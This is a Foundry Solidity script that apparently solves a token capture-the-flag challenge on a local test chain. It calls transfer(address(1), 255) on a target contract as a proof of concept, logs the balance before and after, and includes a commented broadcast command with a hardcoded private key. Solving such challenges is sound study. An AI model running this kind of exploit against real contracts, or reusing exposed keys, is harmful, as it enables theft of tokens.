// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function transfer(address _to, uint256 _value) external returns (bool);
    function balanceOf(address _owner) external view returns (uint256 balance);
}
contract SolveScript is Script {
    address public target = 0xCe85503De9399D4dECa3c0b2bb3e9e7CFCBf9C6B;

    function setUp() public {}

    // 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC
    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        console.log("current user balance : %d", ITarget(target).balanceOf(0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC));

        ITarget(target).transfer(address(1), 255);
        console.log("current user balance after poc: %d", ITarget(target).balanceOf(0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC));
        vm.stopBroadcast();
    }
}
